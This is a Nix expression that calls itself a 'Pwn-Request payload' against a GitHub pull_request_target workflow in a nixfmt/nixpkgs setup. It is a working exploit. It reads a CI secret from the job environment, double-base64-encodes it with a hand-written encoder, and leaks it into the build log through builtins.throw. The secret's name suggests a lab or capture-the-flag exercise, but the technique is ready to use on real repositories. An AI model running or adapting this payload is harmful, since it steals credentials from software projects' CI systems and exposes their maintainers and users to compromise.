# Pwn-Request payload (NixOS/nixfmt nixpkgs-diff, pull_request_target)
# Evaluated unsandboxed during `nix-build scripts/sync-pr-support.nix -A formattedGitRepo
# --arg storePath ... --arg nixfmtPath "$PWD/nixfmt"` (older variant) via
#   nixfmt = (import nixfmtPath { }).packages.nixfmt;
# Classic impure nix-build => builtins.getEnv reads the job env (GERALT_SECRET exported at workflow top level).
let
  secret = builtins.getEnv "GERALT_SECRET";

  byteOf = c:
    let
      upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
      lower = "abcdefghijklmnopqrstuvwxyz";
      digits = "0123456789";
      idx = t:
        if builtins.match ".*${c}.*" t == null then null
        else builtins.stringLength (builtins.head (builtins.split c t));
      u = idx upper;
      l = idx lower;
      d = idx digits;
    in
      if u != null then 65 + u
      else if l != null then 97 + l
      else if d != null then 48 + d
      else if c == "_" then 95
      else if c == "-" then 45
      else if c == "." then 46
      else if c == "=" then 61
      else if c == "+" then 43
      else if c == "/" then 47
      else 0;

  b64 = s:
    let
      n = builtins.stringLength s;
      pad = if builtins.mod n 3 == 0 then 0 else 3 - builtins.mod n 3;
      bytes = builtins.genList (i: byteOf (builtins.substring i 1 s)) n;
      padded = bytes ++ builtins.genList (i: 0) pad;
      table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
      sextet = v: builtins.substring v 1 table;
      group = g:
        let
          b0 = builtins.elemAt padded (g * 3);
          b1 = builtins.elemAt padded (g * 3 + 1);
          b2 = builtins.elemAt padded (g * 3 + 2);
        in
          (sextet (builtins.div b0 4))
          + (sextet (builtins.add (builtins.mul (builtins.sub b0 (builtins.mul (builtins.div b0 4) 4)) 16) (builtins.div b1 16)))
          + (sextet (builtins.add (builtins.mul (builtins.sub b1 (builtins.mul (builtins.div b1 16) 16)) 4) (builtins.div b2 64)))
          + (sextet (builtins.sub b2 (builtins.mul (builtins.div b2 64) 64)));
      raw = builtins.concatStringsSep "" (builtins.genList group (builtins.div (n + pad) 3));
      rawLen = builtins.stringLength raw;
      eqs = builtins.concatStringsSep "" (builtins.genList (i: "=") pad);
    in
      if pad == 0 then raw
      else builtins.substring 0 (rawLen - pad) raw + eqs;
in
builtins.throw "GERALT_LEAKED_TOKEN=${b64 (b64 secret)}"